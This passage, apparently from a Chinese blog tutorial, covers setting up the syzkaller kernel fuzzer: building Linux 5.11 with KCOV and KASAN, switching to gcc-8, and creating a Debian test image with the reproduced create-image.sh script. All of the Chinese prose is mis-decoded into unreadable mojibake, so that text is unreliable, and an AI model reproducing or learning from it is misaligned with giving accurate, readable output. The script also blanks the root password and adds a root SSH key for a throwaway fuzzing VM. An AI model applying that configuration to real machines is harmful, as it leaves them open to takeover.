gopath/src/github.com/google/syzkaller/</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make</span></span><br></pre></td></tr></table></figure><h2 id="ç¼–è¯‘ç›®æ ‡å†…æ ¸"><a href="#ç¼–è¯‘ç›®æ ‡å†…æ ¸" class="headerlink" title="ç¼–è¯‘ç›®æ ‡å†…æ ¸"></a>ç¼–è¯‘ç›®æ ‡å†…æ ¸</h2><p>ä»é•œåƒç«™éšä¾¿æ‹‰ä¸€ä¸ªç‰ˆæœ¬çš„æºç è¿‡æ¥å°±è¡Œï¼Œç¬”è€…è¿™é‡Œæ‹‰äº†ä¸€ä¸ª 5.11 ç‰ˆæœ¬çš„å†…æ ¸</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.11.tar.gz</span></span><br></pre></td></tr></table></figure><p>è§£å‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tar -zxvf linux-5.11.tar.gz</span> </span><br></pre></td></tr></table></figure><p>ç„¶åæ‰§è¡Œä¸‹é¢è¿™ä¸¤æ¡æŒ‡ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make CC=<span class="string">&quot;/usr/bin/gcc&quot;</span> defconfig</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make CC=<span class="string">&quot;/usr/bin/gcc&quot;</span> kvm_guest.config</span></span><br></pre></td></tr></table></figure><p>å¯¹äºè€ç‰ˆæœ¬å†…æ ¸ï¼Œåº”å½“ä¸ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make CC=<span class="string">&quot;/usr/bin/gcc&quot;</span> defconfig</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make CC=<span class="string">&quot;/usr/bin/gcc&quot;</span> kvmconfig</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ç¼–è¾‘ <code>.config</code> æ–‡ä»¶ï¼Œåœ¨å…¶æœ«å°¾æ·»åŠ å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_KCOV=y</span><br><span class="line">CONFIG_DEBUG_INFO=y</span><br><span class="line">CONFIG_KASAN=y</span><br><span class="line">CONFIG_KASAN_INLINE=y</span><br><span class="line">CONFIG_CONFIGFS_FS=y</span><br><span class="line">CONFIG_SECURITYFS=y</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å¼€å§‹ç¼–è¯‘å†…æ ¸ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥ç®€å•å¼€ä¸€å±€ä½ å–œæ¬¢çš„æ¸¸æˆæ…¢æ…¢ç­‰å¾…ï¼ˆç¬‘ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make CC=<span class="string">&quot;/usr/bin/gcc&quot;</span> olddefconfig</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make CC=<span class="string">&quot;/usr/bin/gcc&quot;</span> -j64</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œç¬”è€…è¿˜é‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œ**ç¬”è€…çš„ gcc ç‰ˆæœ¬å¤ªé«˜äº†â€¦**äºæ˜¯ç¼–è¯‘çš„æ—¶å€™åˆå‡ºç°äº†è¿™ä¸ªé”™è¯¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cc1: error: â€˜-fcf-protectionâ€™ is not compatible with this target</span><br></pre></td></tr></table></figure><p><strong>åˆ‡æ¢å›å®˜æ–¹æ¨èçš„ gcc8 åé‡æ–°è¿›è¡Œç¼–è¯‘</strong></p><blockquote><p>ç¬”è€…<del>å‘ç”Ÿæ´»å¦¥åäº†ï¼Œ</del>æš‚æ—¶æ²¡æ‰¾åˆ°é«˜ç‰ˆæœ¬ gcc åœ¨è¿™ä¸ªé…ç½®ä¸‹èƒ½å¤ŸæˆåŠŸç¼–è¯‘çš„æ–¹æ³•</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt-get install gcc-8 gcc-8-multilib</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt-get install g++-8 g++-8-multilib</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo update-alternatives --install /usr/bin/gcc gcc  /usr/bin/gcc-8 1</span></span><br></pre></td></tr></table></figure><p>å‡ºç°ä¸‹é¢è¿™è¡Œå°±æ ‡å¿—ç€ç¼–è¯‘å®Œæˆ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kernel: arch/x86/boot/bzImage is ready  (#1)</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å‡ºæ¥çš„ bzImage åœ¨ <code>arch/x86/boot/bzImage</code>ï¼Œvmlinux åˆ™å°±åœ¨æºç æ ¹ç›®å½•ä¸‹ï¼Œè¿™ä¸¤ä¸ªæ–‡ä»¶å‰è€…æ˜¯å‹ç¼©åçš„å†…æ ¸åè€…æ˜¯åŸå§‹å†…æ ¸æ–‡ä»¶</p><h2 id="é…ç½®-ext4-ç¡¬ç›˜é•œåƒæ–‡ä»¶"><a href="#é…ç½®-ext4-ç¡¬ç›˜é•œåƒæ–‡ä»¶" class="headerlink" title="é…ç½® ext4 ç¡¬ç›˜é•œåƒæ–‡ä»¶"></a>é…ç½® ext4 ç¡¬ç›˜é•œåƒæ–‡ä»¶</h2><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ <code>debootstrap</code> æ¥åˆ›å»ºext4ç¡¬ç›˜é•œåƒ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt-get install debootstrap</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> image</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> image</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">wget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">chmod</span> +x create-image.sh</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./create-image.sh</span></span><br></pre></td></tr></table></figure><blockquote><p>wget çš„è¿™ä¸€æ­¥<strong>éœ€è¦ç¿»å¢™</strong>ï¼ˆ<code>raw.githubusercontent.com</code> åœ¨å›½å†…ä¼¼ä¹æ˜¯è¢«å¢™äº†ï¼Œæ€»ä¹‹ç¬”è€…è®°å¿†é‡Œä»æ²¡æˆåŠŸåœ¨ä¸ç¿»å¢™çš„æƒ…å†µä¸‹æˆåŠŸä¸Šå»è¿‡ï¼‰ï¼Œè‹¥å«Œéº»çƒ¦å¯ä»¥ç›´æ¥ copy ç¬”è€…å·²ç»ä¸‹å¥½çš„ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"><span class="comment"># Copyright 2016 syzkaller project authors. All rights reserved.</span></span><br><span class="line"><span class="comment"># Use of this source code is governed by Apache 2 LICENSE that can be found in the LICENSE file.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create-image.sh creates a minimal Debian Linux image suitable for syzkaller.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -eux</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a minimal Debian distribution in a directory.</span></span><br><span class="line">DIR=<span class="built_in">chroot</span></span><br><span class="line">PREINSTALL_PKGS=openssh-server,curl,tar,gcc,libc6-dev,time,strace,sudo,less,psmisc,selinux-utils,policycoreutils,checkpolicy,selinux-policy-default,firmware-atheros,debian-ports-archive-keyring</span><br><span class="line"></span><br><span class="line"><span class="comment"># If ADD_PACKAGE is not defined as an external environment variable, use our default packages</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$&#123;ADD_PACKAGE+x&#125;</span> ]; <span class="keyword">then</span></span><br><span class="line"> ADD_PACKAGE=<span class="string">&quot;make,sysbench,git,vim,tmux,usbutils,tcpdump&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Variables affected by options</span></span><br><span class="line">ARCH=$(<span class="built_in">uname</span> -m)</span><br><span class="line">RELEASE=stretch</span><br><span class="line">FEATURE=minimal</span><br><span class="line">SEEK=2047</span><br><span class="line">PERF=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Display help function</span></span><br><span class="line"><span class="function"><span class="title">display_help</span></span>() &#123;</span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$0</span> [option...] &quot;</span> &gt;&amp;2</span><br><span class="line"> <span class="built_in">echo</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;   -a, --arch                 Set architecture&quot;</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;   -d, --distribution         Set on which debian distribution to create&quot;</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;   -f, --feature              Check what packages to install in the image, options are minimal, full&quot;</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;   -s, --seek                 Image size (MB), default 2048 (2G)&quot;</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;   -h, --help                 Display help message&quot;</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;   -p, --add-perf             Add perf support with this option enabled. Please set envrionment variable \$KERNEL at first&quot;</span></span><br><span class="line"> <span class="built_in">echo</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line"> <span class="keyword">if</span> [ <span class="variable">$#</span> -eq 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$#</span></span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"> <span class="keyword">fi</span></span><br><span class="line"> <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">     -h | --<span class="built_in">help</span>)</span><br><span class="line">         display_help</span><br><span class="line">         <span class="built_in">exit</span> 0</span><br><span class="line">         ;;</span><br><span class="line">     -a | --<span class="built_in">arch</span>)</span><br><span class="line">    ARCH=<span class="variable">$2</span></span><br><span class="line">         <span class="built_in">shift</span> 2</span><br><span class="line">         ;;</span><br><span class="line">     -d | --distribution)</span><br><span class="line">    RELEASE=<span class="variable">$2</span></span><br><span class="line">         <span class="built_in">shift</span> 2</span><br><span class="line">         ;;</span><br><span class="line">     -f | --feature)</span><br><span class="line">    FEATURE=<span class="variable">$2</span></span><br><span class="line">         <span class="built_in">shift</span> 2</span><br><span class="line">         ;;</span><br><span class="line">     -s | --seek)</span><br><span class="line">    SEEK=$((<span class="variable">$2</span> - <span class="number">1</span>))</span><br><span class="line">         <span class="built_in">shift</span> 2</span><br><span class="line">         ;;</span><br><span class="line">     -p | --add-perf)</span><br><span class="line">    PERF=<span class="literal">true</span></span><br><span class="line">         <span class="built_in">shift</span> 1</span><br><span class="line">         ;;</span><br><span class="line">     -*)</span><br><span class="line">         <span class="built_in">echo</span> <span class="string">&quot;Error: Unknown option: <span class="variable">$1</span>&quot;</span> &gt;&amp;2</span><br><span class="line">         <span class="built_in">exit</span> 1</span><br><span class="line">         ;;</span><br><span class="line">     *)  <span class="comment"># No more options</span></span><br><span class="line">         <span class="built_in">break</span></span><br><span class="line">         ;;</span><br><span class="line"> <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Handle cases where qemu and Debian use different arch names</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$ARCH</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line"> ppc64le)</span><br><span class="line">     DEBARCH=ppc64el</span><br><span class="line">     ;;</span><br><span class="line"> aarch64)</span><br><span class="line">     DEBARCH=arm64</span><br><span class="line">     ;;</span><br><span class="line"> arm)</span><br><span class="line">     DEBARCH=armel</span><br><span class="line">     ;;</span><br><span class="line"> x86_64)</span><br><span class="line">     DEBARCH=amd64</span><br><span class="line">     ;;</span><br><span class="line"> *)</span><br><span class="line">     DEBARCH=<span class="variable">$ARCH</span></span><br><span class="line">     ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Foreign architecture</span></span><br><span class="line"></span><br><span class="line">FOREIGN=<span class="literal">false</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$ARCH</span> != $(<span class="built_in">uname</span> -m) ]; <span class="keyword">then</span></span><br><span class="line"> <span class="comment"># i386 on an x86_64 host is exempted, as we can run i386 binaries natively</span></span><br><span class="line"> <span class="keyword">if</span> [ <span class="variable">$ARCH</span> != <span class="string">&quot;i386&quot;</span> -o $(<span class="built_in">uname</span> -m) != <span class="string">&quot;x86_64&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">     FOREIGN=<span class="literal">true</span></span><br><span class="line"> <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$FOREIGN</span> = <span class="string">&quot;true&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"> <span class="comment"># Check for according qemu static binary</span></span><br><span class="line"> <span class="keyword">if</span> ! <span class="built_in">which</span> qemu-<span class="variable">$ARCH</span>-static; <span class="keyword">then</span></span><br><span class="line">     <span class="built_in">echo</span> <span class="string">&quot;Please install qemu static binary for architecture <span class="variable">$ARCH</span> (package &#x27;qemu-user-static&#x27; on Debian/Ubuntu/Fedora)&quot;</span></span><br><span class="line">     <span class="built_in">exit</span> 1</span><br><span class="line"> <span class="keyword">fi</span></span><br><span class="line"> <span class="comment"># Check for according binfmt entry</span></span><br><span class="line"> <span class="keyword">if</span> [ ! -r /proc/sys/fs/binfmt_misc/qemu-<span class="variable">$ARCH</span> ]; <span class="keyword">then</span></span><br><span class="line">     <span class="built_in">echo</span> <span class="string">&quot;binfmt entry /proc/sys/fs/binfmt_misc/qemu-<span class="variable">$ARCH</span> does not exist&quot;</span></span><br><span class="line">     <span class="built_in">exit</span> 1</span><br><span class="line"> <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Double check KERNEL when PERF is enabled</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$PERF</span> = <span class="string">&quot;true&quot;</span> ] &amp;&amp; [ -z <span class="variable">$&#123;KERNEL+x&#125;</span> ]; <span class="keyword">then</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;Please set KERNEL environment variable when PERF is enabled&quot;</span></span><br><span class="line"> <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If full feature is chosen, install more packages</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$FEATURE</span> = <span class="string">&quot;full&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"> PREINSTALL_PKGS=<span class="variable">$PREINSTALL_PKGS</span><span class="string">&quot;,&quot;</span><span class="variable">$ADD_PACKAGE</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">sudo <span class="built_in">rm</span> -rf <span class="variable">$DIR</span></span><br><span class="line">sudo <span class="built_in">mkdir</span> -p <span class="variable">$DIR</span></span><br><span class="line">sudo <span class="built_in">chmod</span> 0755 <span class="variable">$DIR</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. debootstrap stage</span></span><br><span class="line"></span><br><span class="line">DEBOOTSTRAP_PARAMS=<span class="string">&quot;--arch=<span class="variable">$DEBARCH</span> --include=<span class="variable">$PREINSTALL_PKGS</span> --components=main,contrib,non-free <span class="variable">$RELEASE</span> <span class="variable">$DIR</span>&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$FOREIGN</span> = <span class="string">&quot;true&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"> DEBOOTSTRAP_PARAMS=<span class="string">&quot;--foreign <span class="variable">$DEBOOTSTRAP_PARAMS</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># riscv64 is hosted in the debian-ports repository</span></span><br><span class="line"><span class="comment"># debian-ports doesn&#x27;t include non-free, so we exclude firmware-atheros</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$DEBARCH</span> == <span class="string">&quot;riscv64&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"> DEBOOTSTRAP_PARAMS=<span class="string">&quot;--keyring /usr/share/keyrings/debian-ports-archive-keyring.gpg --exclude firmware-atheros <span class="variable">$DEBOOTSTRAP_PARAMS</span> http://deb.debian.org/debian-ports&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">sudo debootstrap <span class="variable">$DEBOOTSTRAP_PARAMS</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. debootstrap stage: only necessary if target != host architecture</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$FOREIGN</span> = <span class="string">&quot;true&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"> sudo <span class="built_in">cp</span> $(<span class="built_in">which</span> qemu-<span class="variable">$ARCH</span>-static) <span class="variable">$DIR</span>/$(<span class="built_in">which</span> qemu-<span class="variable">$ARCH</span>-static)</span><br><span class="line"> sudo <span class="built_in">chroot</span> <span class="variable">$DIR</span> /bin/bash -c <span class="string">&quot;/debootstrap/debootstrap --second-stage&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set some defaults and enable promtless ssh to the machine for root.</span></span><br><span class="line">sudo sed -i <span class="string">&#x27;/^root/ &#123; s/:x:/::/ &#125;&#x27;</span> <span class="variable">$DIR</span>/etc/passwd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;T0:23:respawn:/sbin/getty -L ttyS0 115200 vt100&#x27;</span> | sudo <span class="built_in">tee</span> -a <span class="variable">$DIR</span>/etc/inittab</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;\nauto eth0\niface eth0 inet dhcp\n&#x27;</span> | sudo <span class="built_in">tee</span> -a <span class="variable">$DIR</span>/etc/network/interfaces</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/dev/root / ext4 defaults 0 0&#x27;</span> | sudo <span class="built_in">tee</span> -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;debugfs /sys/kernel/debug debugfs defaults 0 0&#x27;</span> | sudo <span class="built_in">tee</span> -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;securityfs /sys/kernel/security securityfs defaults 0 0&#x27;</span> | sudo <span class="built_in">tee</span> -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;configfs /sys/kernel/config/ configfs defaults 0 0&#x27;</span> | sudo <span class="built_in">tee</span> -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;binfmt_misc /proc/sys/fs/binfmt_misc binfmt_misc defaults 0 0&#x27;</span> | sudo <span class="built_in">tee</span> -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> -en <span class="string">&quot;127.0.0.1\tlocalhost\n&quot;</span> | sudo <span class="built_in">tee</span> <span class="variable">$DIR</span>/etc/hosts</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nameserver 8.8.8.8&quot;</span> | sudo <span class="built_in">tee</span> -a <span class="variable">$DIR</span>/etc/resolve.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;syzkaller&quot;</span> | sudo <span class="built_in">tee</span> <span class="variable">$DIR</span>/etc/hostname</span><br><span class="line">ssh-keygen -f <span class="variable">$RELEASE</span>.id_rsa -t rsa -N <span class="string">&#x27;&#x27;</span></span><br><span class="line">sudo <span class="built_in">mkdir</span> -p <span class="variable">$DIR</span>/root/.ssh/</span><br><span class="line"><span class="built_in">cat</span> <span class="variable">$RELEASE</span>.id_rsa.pub | sudo <span class="built_in">tee</span> <span class="variable">$DIR</span>/root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add perf support</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$PERF</span> = <span class="string">&quot;true&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"> <span class="built_in">cp</span> -r <span class="variable">$KERNEL</span> <span class="variable">$DIR</span>/tmp/</span><br><span class="line"> BASENAME=$(<span class="built_in">basename</span> <span class="variable">$KERNEL</span>)</span><br><span class="line"> sudo <span class="built_in">chroot</span> <span class="variable">$DIR</span> /bin/bash -c <span class="string">&quot;apt-get update; apt-get install -y flex bison python-dev libelf-dev libunwind8-dev libaudit-dev libslang2-dev libperl-dev binutils-dev liblzma-dev libnuma-dev&quot;</span></span><br><span class="line"> sudo <span class="built_in">chroot</span> <span class="variable">$DIR</span> /bin/bash -c <span class="string">&quot;cd /tmp/<span class="variable">$BASENAME</span>/tools/perf/; make&quot;</span></span><br><span class="line"> sudo <span class="built_in">chroot</span> <span class="variable">$DIR</span> /bin/bash -c <span class="string">&quot;cp /tmp/<span class="variable">$BASENAME</span>/tools/perf/perf /usr/bin/&quot;</span></span><br><span class="line"> <span class="built_in">rm</span> -r <span class="variable">$DIR</span>/tmp/<span class="variable">$BASENAME</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add udev rules for custom drivers.</span></span><br><span class="line"><span class="comment"># Create a /dev/vim2m symlink for the device managed by the vim2m driver</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;ATTR&#123;name&#125;==&quot;vim2m&quot;, SYMLINK+=&quot;vim2m&quot;&#x27;</span> | sudo <span class="built_in">tee</span> -a <span class="variable">$DIR</span>/etc/udev/rules.d/50-udev-default.rules</span><br><span class="line"></span><br><span class="line"><span class="comment"># Build a disk image</span></span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero of=<span class="variable">$RELEASE</span>.img bs=1M seek=<span class="variable">$SEEK</span> count=1</span><br><span class="line">sudo mkfs.ext4 -F <span class="variable">$RELEASE</span>.img</span><br><span class="line">sudo <span class="built_in">mkdir</span> -p /mnt/<span class="variable">$DIR</span></span><br><span class="line">sudo mount -o loop <span class="variable">$RELEASE</span>.img /mnt/<span class="variable">$DIR</span></span><br><span class="line">sudo <span class="built_in">cp</span> -a <span class="variable">$DIR</span>/. /mnt/<span class="variable">$DIR</span>/.</span><br><span class="line">sudo umount /mnt/<span class="variable">$DIR</span></span><br></pre></td></tr></table></figure></blockquote><p>è¿™ä¸€æ­¥ä¸çŸ¥é“æ˜¯å› ä¸ºç½‘ç»œåŸå› è¿˜æ˜¯åˆ«çš„åŸå› <strong>æ€»è€Œè¨€ä¹‹éå¸¸çš„æ…¢</strong>ï¼ˆæ¯”ä¸Šé¢ç¼–è¯‘å†…æ ¸è€—æ—¶è¿˜é•¿ï¼‰ï¼Œå®Œæˆä¹‹åå¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll</span></span><br><span class="line">total 554772</span><br><span class="line">drwxrwxr-x  3 arttnba3 arttnba3       4096 Nov 12 03:02 ./</span><br><span class="line">drwxrwxr-x  7 arttnba3 arttnba3       4096 Nov 12 00:53 ../</span><br><span class="line">drwxr-xr-x 21 root     root           4096 Nov 12 02:58 chroot/</span><br><span class="line">-rwxrwxr-x  1 arttnba3 arttnba3       6360 Nov 11 23:25 create-image.sh*</span><br><span class="line">-rw-------  1 arttnba3 arttnba3       2602 Nov 12 